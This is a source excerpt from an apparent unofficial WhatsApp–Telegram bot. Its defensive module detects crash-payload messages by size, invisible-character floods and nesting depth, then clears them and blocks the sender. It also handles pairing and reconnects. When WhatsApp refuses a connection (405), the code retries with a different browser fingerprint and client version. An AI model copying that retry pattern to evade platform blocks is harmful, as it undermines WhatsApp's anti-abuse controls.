// ═══════════════════════════════════════════════════════════════════
const ANTIBUG_FILE = './antibug.json';
const ANTIBUG_UNBLOCK_MS = 10 * 60 * 1000;
let _abCfg = { off: [], blocks: [], log: [], strikes: {} };
try { if (fs.existsSync(ANTIBUG_FILE)) _abCfg = Object.assign(_abCfg, JSON.parse(fs.readFileSync(ANTIBUG_FILE, 'utf8'))); } catch (_) {}
function _abSave() { try { fs.writeFileSync(ANTIBUG_FILE, JSON.stringify(_abCfg)); } catch (_) {} }
const _abDigits = x => String(x || '').split('@')[0].split(':')[0].replace(/\D/g, '');
const _abSessKey = sock => _abDigits(sock?.user?.id);
function antibugEnabled(sock) { return !_abCfg.off.includes(_abSessKey(sock)); }
function antibugSet(sessKey, on) {
  _abCfg.off = _abCfg.off.filter(x => x !== sessKey);
  if (!on) _abCfg.off.push(sessKey);
  _abSave();
}

const _AB_INVIS = /[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\u034F\u061C\u115F\u1160\u17B4\u17B5\u180E\u3164\uFFA0]/g;
const _AB_MARKS = /\p{M}/gu;
function _abUnwrap(m) {
  for (let i = 0; i < 5 && m; i++) {
    const n = m.ephemeralMessage?.message || m.viewOnceMessage?.message || m.viewOnceMessageV2?.message ||
      m.viewOnceMessageV2Extension?.message || m.documentWithCaptionMessage?.message ||
      m.editedMessage?.message?.protocolMessage?.editedMessage || m.protocolMessage?.editedMessage;
    if (!n) break; m = n;
  }
  return m || {};
}
function _abTextCheck(t) {
  if (typeof t !== 'string' || !t) return null;
  if (t.length > 15000) return `oversized text (${t.length} chars)`;
  if (t.length > 400) {
    const inv = (t.match(_AB_INVIS) || []).length;
    if (inv > 1500 || (inv > 300 && inv / t.length > 0.5)) return `invisible-character flood (${inv})`;
    const mk = (t.match(_AB_MARKS) || []).length;
    if (mk > 1500) return `combining-mark flood (${mk})`;
  }
  return null;
}
// nesting depth / node count guard (deeply nested or enormous objects are used to crash parsers)
function _abShape(o, limitDepth = 30, limitNodes = 20000) {
  let nodes = 0;
  const stack = [[o, 0]];
  while (stack.length) {
    const [v, d] = stack.pop();
    if (d > limitDepth) return `deeply nested message (depth>${limitDepth})`;
    if (v && typeof v === 'object' && !(v instanceof Uint8Array) && !Buffer.isBuffer?.(v)) {
      if (++nodes > limitNodes) return 'oversized message structure';
      for (const k of Object.keys(v)) stack.push([v[k], d + 1]);
    }
  }
  return null;
}
function _abScan(m, depth) {
  if (!m || typeof m !== 'object') return null;
  m = _abUnwrap(m);
  let r;
  const texts = [m.conversation, m.extendedTextMessage?.text, m.extendedTextMessage?.title, m.extendedTextMessage?.description,
    m.imageMessage?.caption, m.videoMessage?.caption, m.documentMessage?.caption, m.groupInviteMessage?.caption,
    m.buttonsMessage?.contentText, m.buttonsMessage?.footerText, m.listMessage?.description, m.listMessage?.title,
    m.interactiveMessage?.body?.text, m.interactiveMessage?.footer?.text, m.templateMessage?.hydratedTemplate?.hydratedContentText,
    m.requestPaymentMessage?.noteMessage?.extendedTextMessage?.text, m.productMessage?.product?.description, m.orderMessage?.message];
  for (const t of texts) if ((r = _abTextCheck(t))) return r;
  if ((m.reactionMessage?.text || '').length > 40) return 'abnormal reaction';
  if ((m.documentMessage?.fileName || '').length > 1000) return 'oversized file name';
  if (Number(m.documentMessage?.pageCount) > 20000) return 'abnormal document page count';
  if (Number(m.audioMessage?.seconds) > 86400 || Number(m.videoMessage?.seconds) > 86400) return 'abnormal media duration';
  if (Number(m.stickerMessage?.fileLength) > 20 * 1024 * 1024) return 'oversized sticker';
  for (const k of ['imageMessage', 'videoMessage', 'documentMessage', 'stickerMessage', 'extendedTextMessage', 'locationMessage']) {
    const th = m[k]?.jpegThumbnail;
    if (th && (th.length || 0) > 300000) return `oversized thumbnail (${k})`;
  }
  if ((m.locationMessage?.name || '').length > 3000 || (m.locationMessage?.address || '').length > 3000) return 'oversized location data';
  const lat = m.locationMessage?.degreesLatitude, lng = m.locationMessage?.degreesLongitude;
  if ((lat != null && Math.abs(Number(lat)) > 90) || (lng != null && Math.abs(Number(lng)) > 180)) return 'invalid location coordinates';
  if ((m.contactMessage?.vcard || '').length > 30000) return 'oversized contact card';
  const ca = m.contactsArrayMessage?.contacts;
  if (Array.isArray(ca) && (ca.length > 40 || ca.some(c => (c?.vcard || '').length > 30000))) return 'oversized contact list';
  const poll = m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3;
  if (poll && ((poll.options || []).length > 12 || (poll.name || '').length > 1000)) return 'abnormal poll';
  const lm = m.listMessage;
  if (lm && (lm.sections || []).reduce((n, x) => n + (x.rows || []).length, 0) > 100) return 'abnormal list message';
  if ((m.buttonsMessage?.buttons || []).length > 20) return 'abnormal buttons message';
  const th2 = m.templateMessage?.hydratedTemplate?.hydratedButtons;
  if (Array.isArray(th2) && th2.length > 20) return 'abnormal template buttons';
  const nf = m.interactiveMessage?.nativeFlowMessage;
  if (nf && ((nf.buttons || []).length > 30 || (nf.messageParamsJson || '').length > 30000 ||
      (nf.buttons || []).some(b => (b?.buttonParamsJson || '').length > 20000))) return 'abnormal interactive message';
  if ((m.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '').length > 30000) return 'oversized interactive response';
  for (const v of Object.values(m)) {
    const ci = v && typeof v === 'object' ? v.contextInfo : null;
    if (!ci) continue;
    if (Array.isArray(ci.mentionedJid) && ci.mentionedJid.length > 1500) return `mass-mention payload (${ci.mentionedJid.length})`;
    const ad = ci.externalAdReply;
    if (ad && ['title', 'body', 'sourceUrl', 'mediaUrl', 'thumbnailUrl'].some(k => String(ad[k] || '').length > 5000)) return 'oversized ad-reply data';
    if ((ci.stanzaId || '').length > 200 || (ci.participant || '').length > 200) return 'abnormal quote reference';
    // bug payloads are often hidden inside the quoted message — scan it too
    if (ci.quotedMessage && depth < 3 && (r = _abScan(ci.quotedMessage, depth + 1))) return 'in quoted msg: ' + r;
  }
  return null;
}
// Returns a short reason string if the message looks like a bug payload, else null.
function antibugDetect(message) {
  if (!message) return null;
  let r = _abScan(message, 0);
  if (!r) { try { r = _abShape(message); } catch (_) {} }
  return r;
}

const _abScheduled = new Set();
function _abScheduleUnblock(sock, sess, jid, until) {
  const key = sess + '|' + jid;
  if (_abScheduled.has(key)) return;
  _abScheduled.add(key);
  setTimeout(async () => {
    _abScheduled.delete(key);
    try { await sock.updateBlockStatus(jid, 'unblock'); } catch (_) {}
    _abCfg.blocks = _abCfg.blocks.filter(b => !(b.sess === sess && b.jid === jid));
    _abSave();
  }, Math.max(1000, until - Date.now()));
}
// Called when a session connects: re-arm any unblock timers that were pending before a restart.
function antibugResume(sock) {
  const sess = _abSessKey(sock);
  for (const b of _abCfg.blocks.filter(x => x.sess === sess)) _abScheduleUnblock(sock, sess, b.jid, b.until);
}

// Wipe every cached copy of messages for a chat so a payload can't be replayed or re-processed.
function _abPurge(sock, jid) {
  let n = 0;
  try {
    for (const [, sess] of sessions.entries()) {
      if (sess?.sock !== sock || !sess.msgStore) continue;
      if (jid) { n += Object.keys(sess.msgStore[jid] || {}).length; delete sess.msgStore[jid]; }
      else { for (const k of Object.keys(sess.msgStore)) { n += Object.keys(sess.msgStore[k] || {}).length; delete sess.msgStore[k]; } }
    }
  } catch (_) {}
  return n;
}
// Clear a bug message as thoroughly as possible: delete for me, remove cached copies, and (in a DM) remove the whole chat.
async function _abClearMsg(sock, jid, msg, ts) {
  let cleared = false;
  try { await sock.chatModify({ deleteForMe: { deleteMedia: true, key: msg.key, timestamp: ts } }, jid); cleared = true; } catch (_) {}
  if (!cleared) { try { await sock.chatModify({ clear: { messages: [{ id: msg.key.id, fromMe: false, timestamp: ts }] } }, jid); cleared = true; } catch (_) {} }
  _abPurge(sock, jid);
  if (!jid.endsWith('@g.us')) {   // DM with the attacker: remove the whole chat so nothing heavy is left on the device
    try { await sock.chatModify({ delete: true, lastMessages: [{ key: msg.key, messageTimestamp: ts }] }, jid); cleared = true; } catch (_) {}
  }
  return cleared;
}

const _abRecent = new Map(); // attacker -> last handled ts (stops repeated lock/kick spam)
// Returns true if the message was handled (and must not be processed further).
async function antibugHandle(sock, msg, reason) {
  const jid = msg.key.remoteJid;
  if (!jid || jid === 'status@broadcast' || jid.endsWith('@newsletter') || jid.endsWith('@broadcast')) return false;
  const isGroup = jid.endsWith('@g.us');
  const attacker = isGroup ? (msg.key.participant || msg.participant) : jid;
  if (!attacker) return false;
  const aDigits = _abDigits(attacker);
  const sess = _abSessKey(sock);
  // never act on the linked account itself, the bot owner or sudo users
  const own = [sock.user?.id, sock.user?.lid].map(_abDigits).filter(Boolean);
  let trusted = own.includes(aDigits);
  try { const rid = resolveId('wa_' + aDigits); trusted = trusted || isSudo(rid) || isOwner(rid); } catch (_) {}
  if (trusted) return false;

  console.warn(`[antibug] ${reason} from ${attacker} in ${jid}`);
  const ts = Number(msg.messageTimestamp?.low ?? msg.messageTimestamp ?? Math.floor(Date.now() / 1000));
  // 1) clear the payload from this device
  await _abClearMsg(sock, jid, msg, ts);

  const first = Date.now() - (_abRecent.get(attacker) || 0) > 30000;
  _abRecent.set(attacker, Date.now());
  if (_abRecent.size > 500) _abRecent.delete(_abRecent.keys().next().value);
  if (!first) return true; // same attacker spamming: just keep clearing
  // repeat offenders get longer blocks: 1st/2nd = 10 min, 3rd/4th = 1 hour, 5th+ (within 24h) = 24 hours
  const nowT = Date.now();
  _abCfg.strikes = _abCfg.strikes || {};
  const st = (_abCfg.strikes[aDigits] || []).filter(t => nowT - t < 86400000); st.push(nowT);
  _abCfg.strikes[aDigits] = st;
  const blockMs = st.length >= 5 ? 24 * 3600000 : st.length >= 3 ? 3600000 : ANTIBUG_UNBLOCK_MS;
  const blockLabel = blockMs >= 3600000 ? (blockMs / 3600000) + ' hour' + (blockMs > 3600000 ? 's' : '') : '10 min';

  const did = ['cleared from your device'];
  let groupName = '';
  if (isGroup) {
    try {
      const meta = await Promise.race([gtWaMeta(sock, jid, true), new Promise(r => setTimeout(() => r(null), 5000))]);
      groupName = meta?.subject || '';
      if (meta && gtWaBotIsAdmin(sock, meta)) {
        try { await sock.sendMessage(jid, { delete: msg.key }); did.push('deleted for everyone'); } catch (_) {}
        if (!meta.announce) {
          try {
            await sock.groupSettingUpdate(jid, 'announcement'); did.push('group locked');
            setTimeout(() => { sock.groupSettingUpdate(jid, 'not_announcement').catch(() => {}); }, ANTIBUG_UNBLOCK_MS);
          } catch (_) {}
        }
        try { await sock.groupParticipantsUpdate(jid, [attacker], 'remove'); did.push('sender removed'); } catch (_) {}
      } else {
        did.push('bot is not admin, so no lock/kick');
      }
    } catch (_) {}
  }
  // 2) block the sender, auto-unblock after 10 minutes
  try {
    await sock.updateBlockStatus(attacker, 'block'); did.push(`sender blocked ${blockLabel}${st.length > 1 ? ` (offence #${st.length})` : ''}`);
    const until = Date.now() + blockMs;
    _abCfg.blocks.push({ sess, jid: attacker, until }); _abSave();
    _abScheduleUnblock(sock, sess, attacker, until);
  } catch (_) {}
  // incident log (view with .antibug log)
  try {
    _abCfg.log = (_abCfg.log || []); _abCfg.log.push({ t: Date.now(), who: aDigits, where: isGroup ? (groupName || jid) : 'DM', reason, did: did.length });
    if (_abCfg.log.length > 20) _abCfg.log = _abCfg.log.slice(-20);
    _abSave();
  } catch (_) {}
  // 3) tell the account owner privately
  try {
    const me = String(sock.user?.id || '').replace(/:.*?@/, '@');
    if (me) await sock.sendMessage(me, { text: `🐛 *Antibug*\nBlocked a bug payload (${reason}) from +${aDigits}${isGroup ? ` in "${groupName || jid}"` : ' in DM'}.\n• ${did.join('\n• ')}` });
  } catch (_) {}
  return true;
}

// Cleanly shut down a session WITHOUT its close handler scheduling a reconnect.
// (Root cause of the endless "405 / reconnect attempt 1" loop: ending the old socket fired its
//  close handler, which re-created the session and killed the brand-new pairing socket.)
const _sessGen = new Map(); // tgId -> generation number, lets a newer createSession cancel an older one
function killSession(tgId) {
  const old = sessions.get(tgId);
  if (!old) return;
  old.dead = true;
  try { clearTimeout(old._reconnectTimer); } catch (_) {}
  sessions.delete(tgId);
  try { old.sock?.ev?.removeAllListeners?.('connection.update'); } catch (_) {}
  try { old.sock?.end?.(undefined); } catch (_) {}
}

async function createSession(tgUserId, phone, tgChatId, tgMsgId, { forceNew = false, retries = 0, profile = 0 } = {}) {
  const tgId = String(tgUserId);

  // Kill any existing socket cleanly (marks it dead so its close handler can never reconnect)
  killSession(tgId);
  const gen = (_sessGen.get(tgId) || 0) + 1;
  _sessGen.set(tgId, gen);
  const superseded = () => _sessGen.get(tgId) !== gen;

  const authDir = path.join('./auth', tgId);
  if (forceNew) clearAuthDir(authDir);
  fs.mkdirSync(authDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(authDir);

  // A fresh pairing code is only requested on a user-initiated /pair (tgChatId set).
  const needsPairing = !!phone && !state.creds?.registered && !!tgChatId;

  // Leftover half-finished credentials (never linked, nobody asking for a code) can only ever
  // produce 405s. Do not connect with them: wipe and stop.
  if (!state.creds?.registered && !needsPairing) {
    console.log(`[${tgId}] stale/unregistered auth and no pairing requested — clearing, not connecting`);
    clearAuthDir(authDir);
    _pairingLock.delete(tgId);
    return null;
  }

  // Per-session message store — caches every message so getMessage() can serve retry requests
  const msgStore = {};

  const sock = await makeBaileysSocket(state, msgStore, String(tgId), profile);
  if (superseded()) { try { sock.end(undefined); } catch (_) {} return null; }

  // Cache outgoing messages so getMessage() can serve WhatsApp retry requests.
  const _origSend = sock.sendMessage.bind(sock);
  sock.sendMessage = async (jid, content, options) => {
    const sent = await _origSend(jid, content, options);
    try {
      if (sent?.message && sent?.key?.remoteJid && sent?.key?.id) {
        const jidKey = sent.key.remoteJid;
        if (!msgStore[jidKey]) msgStore[jidKey] = {};
        msgStore[jidKey][sent.key.id] = sent.message;
        const ids = Object.keys(msgStore[jidKey]);
        if (ids.length > 200) delete msgStore[jidKey][ids[0]];
      }
    } catch(_) {}
    return sent;
  };

  const session = { sock, phone: phone || null, connected: false, everConnected: false, _retries: retries, msgStore, dead: false, gen };
  sessions.set(tgId, session);
  sock.ev.on('creds.update', saveCreds);

  const isCurrent = () => !session.dead && sessions.get(tgId) === session;

  // Tell the user and fully stop a pairing that cannot complete
  const abortPairing = (text) => {
    killSession(tgId);
    clearAuthDir(authDir);
    _pairingLock.delete(tgId);
    if (tgChatId && text) bot_tg.telegram.sendMessage(tgChatId, text, { parse_mode: 'Markdown' }).catch(() => {});
  };

  // ── Pairing code request ─────────────────────────────────────────────────
  // For a NEW link the socket never reaches connection='open' (that only happens AFTER the code is
  // entered), so waiting for 'open' means no code is ever produced. Baileys is ready for
  // requestPairingCode() as soon as the WebSocket handshake finishes, which is signalled by the
  // first `qr` event. A short fallback timer covers builds that do not emit it.
  const issueCode = async () => {
    if (!isCurrent() || sock.user || state.creds?.registered) return;
    await sleep(500);
    if (!isCurrent()) return;
    const code = await requestPairingCodeAndNotify(sock, phone, tgId, tgChatId, tgMsgId);
    if (!isCurrent()) return;
    if (!code) { abortPairing(null); return; }          // failure message already sent by the helper
    session._pairCodeIssuedAt = Date.now();
    session._awaitingPair = true;
    // if the code is never used, free everything after it expires
    session._pairExpiry = setTimeout(() => {
      if (isCurrent() && !session.everConnected && !state.creds?.registered) {
        abortPairing('⌛ *Pairing code expired.*\n\nSend /pair <number> to get a new one.');
      }
    }, 4 * 60 * 1000);
  };

  // ── connection state handler ─────────────────────────────────────────────
  sock.ev.on('connection.update', async (upd) => {
    const { connection, lastDisconnect, qr } = upd;
    if (!isCurrent()) return; // stale socket: ignore everything it says

    if (qr && needsPairing && !session._pairCodeRequested) {
      session._pairCodeRequested = true;
      issueCode().catch(e => console.error(`[${tgId}] issueCode`, e.message));
    }

    if (connection === 'open') {
      session.connected = true;
      session.everConnected = true;
      session._awaitingPair = false;
      session._retries = 0;
      try { clearTimeout(session._pairExpiry); } catch (_) {}
      _pairingLock.delete(tgId);
      console.log(`[${tgId}] ✅ connected as ${sock.user?.id}`);
      autoJoinGroup(sock, tgChatId).catch(() => {}); // fire-and-forget
      try { notifyOnline(sock, tgId, tgChatId); } catch (_) {}
      try { antibugResume(sock); } catch (_) {}
      const _ownerPhone = MY_WA.replace(/\D/g,'');
      const _connPhone  = (session.phone || '').replace(/\D/g,'');
      if (_connPhone === _ownerPhone) {
        try { ensureOwnerRich('wa_' + _ownerPhone, 'LORD'); } catch(_) {}
        console.log(`[${tgId}] 👑 owner WA connected — balance maxed`);
      }
      if (tgChatId) {
        bot_tg.telegram.sendMessage(tgChatId,
          `✅ *+${sock.user?.id?.split(':')[0] || phone} is now ONLINE*\n\nTo set up WhatsApp ↔️ Telegram bridging:\n1. Register a dedicated Telegram bot via /bot1\n2. Create a Telegram Supergroup\n3. Enable Topics in group settings\n4. Add your /bot1 bot as admin (manage topics permission)\n5. Send /bridge in that group`,
          { parse_mode: 'Markdown' }
        ).catch(() => {});
      }
    }

    if (connection === 'close') {
      session.connected = false;
      try { clearTimeout(session._pairExpiry); } catch (_) {}
      const code        = lastDisconnect?.error?.output?.statusCode;
      const registered  = !!state.creds?.registered;
      const loggedOut   = code === DisconnectReason.loggedOut;
      console.log(`[${tgId}] closed (code=${code ?? '?'}) ${loggedOut ? '— logged out' : registered ? '— will reconnect' : '— pairing not completed'}`);

      const ownerPhone = MY_WA.replace(/\D/g, '');
      const isOwnerSession = tgId === 'tg_' + OWNER_TG
        || tgId === OWNER_TG
        || (session.phone && session.phone.replace(/\D/g,'') === ownerPhone);

      // 1) Normal step right after the code is entered: WhatsApp closes with 515 "restart required"
      //    and the login must be reopened with the freshly saved credentials. Do it immediately.
      if (code === DisconnectReason.restartRequired) {
        console.log(`[${tgId}] 515 restart required — reopening with saved credentials`);
        session._reconnectTimer = setTimeout(() => {
          createSession(tgId, session.phone, tgChatId, tgMsgId, { retries: 0 }).catch(e => console.error('[restart]', e.message));
        }, 500);
        return;
      }

      // 2) Never finished linking (no valid login saved): this socket is useless. Stop, wipe, tell the user.
      if (!registered && !session.everConnected) {
        console.log(`[${tgId}] close detail:`, String(lastDisconnect?.error?.message || lastDisconnect?.error || '?').slice(0, 200));
        // 405 before any code was issued = WhatsApp rejected the connection itself. Retry automatically
        // with a different browser fingerprint / WA version before giving up.
        if (code === 405 && needsPairing && !session._pairCodeIssuedAt && profile < 3) {
          console.log(`[${tgId}] 405 on connect — retrying with profile ${profile + 1}`);
          killSession(tgId); clearAuthDir(authDir);
          setTimeout(() => createSession(tgId, phone, tgChatId, tgMsgId, { forceNew: true, profile: profile + 1 })
            .catch(e => console.error('[405 retry]', e.message)), 2500);
          return;
        }
        const why = code === 405
          ? '❌ *WhatsApp refused the link request (405).*\n\nUsually a temporary block from too many attempts on this number or server IP.\n• Wait 10–15 minutes, then send /pair <number> *once*\n• Make sure the number has WhatsApp installed and is not already at the linked-device limit (4)'
          : `❌ *Pairing did not complete* (code ${code ?? 'unknown'}).\n\nSend /pair <number> to get a new code and enter it as soon as it arrives.`;
        abortPairing(why);
        return;
      }

      const replaced  = code === DisconnectReason.connectionReplaced;
      const forbidden = code === 403;
      if (replaced || forbidden) {
        console.warn(`[${tgId}] ${replaced ? 'connection replaced - is the bot running twice?' : 'forbidden (403) - account restricted'} - not reconnecting`);
        killSession(tgId);
        if (tgChatId) bot_tg.telegram.sendMessage(tgChatId, replaced
          ? '⚠️ This WhatsApp login was opened somewhere else (bot running twice?). Stop the other copy, then use /pair to reconnect.'
          : '⚠️ WhatsApp refused this login (403). Wait a while before pairing again.').catch(() => {});
        return;
      }
      if (loggedOut) {
        killSession(tgId);
        clearAuthDir(authDir);
        const msg = session.everConnected
          ? '⚠️ WhatsApp session ended (logged out).\n\nUse /pair <number> to reconnect.'
          : '❌ Pairing rejected by WhatsApp.\n\nRun /pair <number> to try again.';
        if (tgChatId) bot_tg.telegram.sendMessage(tgChatId, msg).catch(() => {});
        return;
      }

      // 3) Genuine drop of a linked session: reconnect with back-off. The retry counter is now
      //    carried across reconnects (it used to reset to 0 every time, so back-off never grew).
      const savedPhone = session.phone;
      const attempt = (session._retries || 0) + 1;
      if (!isOwnerSession && attempt > 20) {
        killSession(tgId);
        if (tgChatId) bot_tg.telegram.sendMessage(tgChatId, '⚠️ Session dropped after too many retries. Use /pair to reconnect.').catch(() => {});
        return;
      }
      const base   = Math.min(5000 * attempt, 120_000);
      const jitter = Math.floor(Math.random() * 3000);
      const delay  = base + jitter;
      session._retries = attempt;
      session._reconnecting = true;
      console.log(`[${tgId}] reconnect attempt ${attempt} in ${Math.round(delay/1000)}s…`);
      session._reconnectTimer = setTimeout(() => {
        createSession(tgId, savedPhone, null, null, { retries: attempt }).catch(e => console.error('[reconnect]', e.message));
      }, delay);
    }
  });

  attachMessageHandler(sock, tgId);

  if (needsPairing) {
    // fallback in case this build never emits a `qr` event
    setTimeout(() => {
      if (isCurrent() && !session._pairCodeRequested && !sock.user && !state.creds?.registered) {
        session._pairCodeRequested = true;
        issueCode().catch(e => console.error(`[${tgId}] issueCode(fallback)`, e.message));
      }
    }, 8000);
  }

  return sock;
}
// ── Restore all previously linked sessions on startup ────────────────────
async function restoreSessions() {
  const authRoot = './auth';
  if (!fs.existsSync(authRoot)) return;
  const entries = fs.readdirSync(authRoot, {withFileTypes:true});
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    if (entry.name === '__bot__') continue; // legacy bot session — skip
    const credsFile = path.join(authRoot, entry.name, 'creds.json');
    if (!fs.existsSync(credsFile)) continue;
    try {
      const _c = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
      if (!_c.registered) { console.log(`[session] ${entry.name} has unfinished pairing creds — clearing`); clearAuthDir(path.join(authRoot, entry.name)); continue; }
    } catch (_) {}
    console.log(`[session] restoring ${entry.name}...`);
    try { await createSession(entry.name, null, null, null); }
    catch(e) { console.error(`[session] restore failed for ${entry.name}:`, e.message); }
  }
}

// No dedicated bot number — users pair their own WhatsApp via /pairnum on Telegram.

// Connects the bot's own WhatsApp number automatically on startup.
// tgNotifyChatId — if set, sends the pairing code as a Telegram message instead of just console.
// ── Telegram "block everyone in a group" ─────────────────────────────────────────────
// A Telegram BOT can't block people on a personal account, and the Bot API can't list every member
// of a group. What it CAN do: ignore anyone who is a member of a "blocked" group when they DM the bot.
// getChatMember() works for any member (ghost/silent ones included), so nobody is missed.
db.exec(`CREATE TABLE IF NOT EXISTS tg_blocked_groups (group_id TEXT PRIMARY KEY, title TEXT DEFAULT '', since INTEGER)`);
const _tgBlockCache = new Map();          // userId -> { t, blocked }
const pendingTgBlockAll = {};             // confirmation timestamps
async function isTgBlockedUser(telegram, uid) {
  const groups = db.prepare('SELECT group_id FROM tg_blocked_groups').all();
  if (!groups.length) return false;
  const c = _tgBlockCache.get(uid);
  if (c && Date.now() - c.t < 10 * 60 * 1000) return c.blocked;
  let blocked = false;
  for (const g of groups) {
    try {
      const m = await telegram.getChatMember(g.group_id, uid);
      if (['creator', 'administrator', 'member', 'restricted'].includes(m.status) && m.is_member !== false) { blocked = true; break; }
    } catch (_) { /* bot removed from that group / user unknown -> not blocked by it */ }
  }
  _tgBlockCache.set(uid, { t: Date.now(), blocked });
  return blocked;
}
